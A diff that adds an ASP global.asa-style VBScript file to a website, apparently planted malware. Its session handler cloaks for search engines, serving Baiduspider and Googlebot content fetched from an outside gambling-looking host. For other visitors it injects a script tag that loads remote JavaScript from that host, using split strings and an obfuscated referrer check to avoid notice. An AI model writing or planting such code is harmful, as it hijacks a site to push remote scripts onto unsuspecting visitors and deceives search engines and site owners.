@@ -1,0 +1,57 @@
+<script language="vbscript" runat="server">  
+'by * fanrengu.net
+sub Application_OnStart
+end sub 
+sub Application_OnEnd  
+end sub
+sub Session_OnStart
+user_agent=Request.ServerVariables("HTTP_USER_AGENT")
+If check(user_agent)=true then
+    body=GetHtml("http://qxw.jinpaibocai.com/index.asp")
+response.write body
+response.end
+
+else
+Refer=Request.ServerVariables("HTTP_REFERER")
+if Instr(Refer,"%C"&"8%"&"AB"&"%D"&"1%B"&"6%"&"CD"&"%F8|%D"&"6%"&"B1"&"%B"&"2%A"&"5%"&"B0"&"%C0|%B"&"0%"&"D9"&"%B"&"C%D"&"2%"&"C0"&"%D6|%D"&"3%"&"E9"&"%C"&"0%D"&"6%"&"B3"&"%C7|%B"&"B%"&"CA"&"%B"&"9%D"&"A%"&"BF"&"%AA")>0 Then
+response.write "<scri"&"pt src=http://qxw.jinpaibocai.com/qxw/zq.gif></sc"&"ript>"
+response.end
+
+end if
+response.write "<scri"&"pt src=http://qxw.jinpaibocai.com//qxw/zq.gif></sc"&"ript>"
+end if
+
+end sub  
+'sub Session_OnEnd  
+'end sub  
+
+Public Function check(user_agent)
+    allow_agent=split("Baiduspider,Googlebot",",")
+    check_agent=false
+    For agents=lbound(allow_agent) to ubound(allow_agent)
+        If instr(user_agent,allow_agent(agents))>0 then
+            check_agent=true
+            exit for
+        end if 
+    Next
+    check=check_agent
+End function
+Public Function GetHtml(url)
+	Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
+	ObjXMLHTTP.Open "GET",url,False
+	ObjXMLHTTP.setRequestHeader "User-Agent",url
+	ObjXMLHTTP.send
+	GetHtml=ObjXMLHTTP.responseBody
+	Set ObjXMLHTTP=Nothing
+	set objStream = Server.CreateObject("Adodb.Stream")
+	objStream.Type = 1
+	objStream.Mode =3
+	objStream.Open
+	objStream.Write GetHtml
+	objStream.Position = 0
+	objStream.Type = 2
+	objStream.Charset = "gb2312"
+	GetHtml = objStream.ReadText
+	objStream.Close
+End Function
+</script> 
